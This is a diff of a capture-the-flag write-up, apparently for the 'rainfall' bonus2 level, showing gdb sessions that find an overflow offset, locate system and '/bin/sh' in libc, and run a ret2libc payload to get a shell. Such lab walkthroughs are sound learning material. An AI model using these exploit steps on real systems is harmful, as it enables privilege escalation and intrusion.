@@ -199,139 +199,154 @@ Do nothing
 
 Try to overflow the strcat with a pattern
 
-	(gdb-peda)$ r coucou $(cat file)
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 coucou $(cat file)
+	(gdb) r coucou $(cat /tmp/pattern)
+	Starting program: /home/user/bonus2/bonus2 coucou $(cat /tmp/pattern)
 	Hello coucou
-	[Inferior 1 (process 68280) exited with code 015]
-	Warning: not running
+	[Inferior 1 (process 9596) exited with code 015]
 
 Nope
 
-	(gdb-peda)$ r $(cat file) coucou
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) coucou
-	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAacoucou
-	[Inferior 1 (process 68288) exited with code 065]
-	Warning: not running
+	(gdb) r $(cat /tmp/pattern) coucou
+	Starting program: /home/user/bonus2/bonus2 $(cat /tmp/pattern) coucou
+	Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJcoucou
+	[Inferior 1 (process 9599) exited with code 065]
 
 Nope
 
-	gdb-peda$ r $(cat file) $(cat file)
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) $(cat file)
-	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAAA%AAsAABAA$AAnAACAA-AA(AADAA;A
+	(gdb) r $(cat /tmp/pattern) $(cat /tmp/pattern)
+	Starting program: /home/user/bonus2/bonus2 $(cat /tmp/pattern) $(cat /tmp/pattern)
+	Hello AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
 
 	Program received signal SIGSEGV, Segmentation fault.
+	0x08004848 in ?? ()
 
 Segfault!
 
-	(gdb-peda)$ pattern search
-	Registers contain pattern buffer:
-	EBP+0 found at offset: 26
-	....
+	(gdb) i r
+	eax            0x4f	79
+	ecx            0xffffffff	-1
+	edx            0xb7fd28b8	-1208145736
+	ebx            0xbffff440	-1073744832
+	esp            0xbffff3f0	0xbffff3f0
+	ebp            0x48484747	0x48484747
+	esi            0xbffff48c	-1073744756
+	edi            0xbffff43c	-1073744836
+	eip            0x8004848	0x8004848
+	eflags         0x210282	[ SF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
 
-We don't have EIP
+We can see the pattern in EIP and half of EIP
 
 First, search the good argument for the overflow with 2 different pattern
 
-	(gdb-peda)$ r $(python -c 'print "B"*200') $(cat file)
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "B"*200') $(cat file)
-	Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAA%AAsAABAA$AAnAACAA-AA(AADAA;A
+	(gdb) r $(python -c 'print "B"*200') $(python -c 'print "A"*200')
+	Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*200') $(python -c 'print "A"*200')
+	Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 	Program received signal SIGSEGV, Segmentation fault.
-	....
-	EBP: 0x41414441 ('ADAA') <---- gdb patter
-	....
-	Stopped reason: SIGSEGV
-	0x0800413b in ?? ()
-
-Not the first arg
-
-	(gdb-peda)$ r $(cat file) $(python -c 'print "B"*200')
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(cat file) $(python -c 'print "B"*200')
-	Hello AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
-
-	Program received signal SIGSEGV, Segmentation fault.
-	....
-	EBP: 0x42424242 ('BBBB') <---- Good
-	....
-	Stopped reason: SIGSEGV
-	0x08004242 in ?? ()
+	0x08004141 in ?? ()
+	(gdb) i r
+	eax            0x4f	79
+	ecx            0xffffffff	-1
+	edx            0xb7fd28b8	-1208145736
+	ebx            0xbffff450	-1073744816
+	esp            0xbffff400	0xbffff400
+	ebp            0x41414141	0x41414141         <---- AAAA
+	esi            0xbffff49c	-1073744740
+	edi            0xbffff44c	-1073744820
+	eip            0x8004141	0x8004141
+	eflags         0x210286	[ PF SF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
 
 It's in the second argument
 
 The check on the LANG env variable is stored on a global variable "language" and has an influence on some parts of the function "greetuser"
 
-Let's try with "fil" in LANG
+Let's try with "fi" in LANG
 
-	$ export LANG="fi"
-	$ echo $LANG
-	fi
+	$ LANG=fi gdb bonus2 
 
-	(gdb-peda)$ r $(python -c 'print "A"*200') $(cat file)
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "A"*200') $(cat file)
-	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%AAsAABAA$AAnAACAA-AA(AADAA;A
+	(gdb) r $(python -c 'print "B"*200') $(python -c 'print "A"*200')
+	Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*200') $(python -c 'print "A"*200')
+	Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 	Program received signal SIGSEGV, Segmentation fault.
+	0x41414141 in ?? ()
 
-	(gdb-peda)$ pattern search
-	Registers contain pattern buffer:
-	EBP+0 found at offset: 14
-	EIP+0 found at offset: 18
+	(gdb) i r
+	eax            0x5b	91
+	ecx            0xffffffff	-1
+	edx            0xb7fd28b8	-1208145736
+	ebx            0xbffff450	-1073744816
+	esp            0xbffff400	0xbffff400
+	ebp            0x41414141	0x41414141
+	esi            0xbffff49c	-1073744740
+	edi            0xbffff44c	-1073744820
+	eip            0x41414141	0x41414141
+	eflags         0x210286	[ PF SF IF RF ID ]
+	cs             0x73	115
+	ss             0x7b	123
+	ds             0x7b	123
+	es             0x7b	123
+	fs             0x0	0
+	gs             0x33	51
 
-We have EIP! at offset 18
+We have EIP! Get the offset now
 
-	(gdb-peda)$ r $(python -c 'print "A"*200') $(python -c 'print "B"*22')
-	Starting program: /home/nico/42/rainfall/bonus2/Ressources/bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*22')
-	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBB
+	(gdb) r $(python -c 'print "B"*200') $(cat /tmp/pattern)
+	Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B"*200') $(cat /tmp/pattern)
+	Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
 
 	Program received signal SIGSEGV, Segmentation fault.
-	...
-	EIP: 0x42424242 ('BBBB')
-	....
-	Stopped reason: SIGSEGV
-	0x42424242 in ?? ()
+	0x46464545 in ?? ()
 
-It's correct
+In EIP there is EEFF -> The offset start at the 3rd E
+
+	/get_offset.py 45
+	E => offset = 16
+
+The offset of E is 16 -> + 2 because it's the third = 18
+
+The offset foir overwrite EIP is 18
 
 Let's check if we can do a ret2libc : need the address of :
 
 - "system"
 - a "/bin/sh" string
 
-Let's check if we have a "/bin/sh" string, if not we will add it in the env
-
-	(gdb-peda)$ find "/bin/sh"
-	Searching for '/bin/sh' in: None ranges
-	Found 1 results, display max 1 items:
-	libc : 0xf7f52f68 ("/bin/sh")
-
-Ok, there is the string "/bin/sh"
-
-Let's go in the vm and exploit like this
-
-	(gdb) b *main+258
-	(gdb) r
+Let's check if we have a "/bin/sh" string
 
 	(gdb) info proc map
-	process 4310
+	process 9646
 	Mapped address spaces:
 
 		Start Addr   End Addr       Size     Offset objfile
-		 0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
-		 0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
-		 0x804a000  0x806b000    0x21000        0x0 [heap]
-		0xb7e2b000 0xb7e2c000     0x1000        0x0
+		0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
+		0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
+		0x804a000  0x806b000    0x21000        0x0 [heap]
+		0xb7e2b000 0xb7e2c000     0x1000        0x0 
 		0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
 		0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
 		0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
-		0xb7fd2000 0xb7fd5000     0x3000        0x0
-		0xb7fdb000 0xb7fdd000     0x2000        0x0
+		0xb7fd2000 0xb7fd5000     0x3000        0x0 
+		0xb7fdb000 0xb7fdd000     0x2000        0x0 
 		0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
 		0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
 		0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
 		0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
 		0xbffdf000 0xc0000000    0x21000        0x0 [stack]
 
-Search in the libc.so, start at "0xb7e2c000", end at "0xb7fcf000"
+Check in the libc, start at 0xb7e2c000 and end at 0xb7fcf000
 
 	(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
 	0xb7f8cc58
@@ -340,10 +355,9 @@ Search in the libc.so, start at "0xb7e2c000", end at "0xb7fcf000"
 	(gdb) x/s 0xb7f8cc58
 	0xb7f8cc58:	 "/bin/sh"
 
-We have the address of "/bin/sh" string : 0xb7f8cc58
+Ok, there is the string "/bin/sh" at the address "0xb7f8cc58"
 
-
-	(gdb) info function system
+	(gdb) info function system 
 	All functions matching regular expression "system":
 
 	Non-debugging symbols:
@@ -351,7 +365,7 @@ We have the address of "/bin/sh" string : 0xb7f8cc58
 	0xb7e6b060  system
 	0xb7f49550  svcerr_systemerr
 
-The address of "system" is "0xb7e6b060"
+The address of the function system is 0xb7e6b060
 
 We can do it properly with "exit" instead of junk in the ret address
 
@@ -378,11 +392,9 @@ Let's build the payload
 
 	python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"'
 
-Don't forget the env variable LANG
+Exploit!
 
-	$ export LANG="fil"
-
-	$ ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
+	$ LANG=fi ./bonus2 $(python -c 'print "A"*200') $(python -c 'print "B"*18+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7"')
 	Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBB`�����X���
 
 	$ whoami
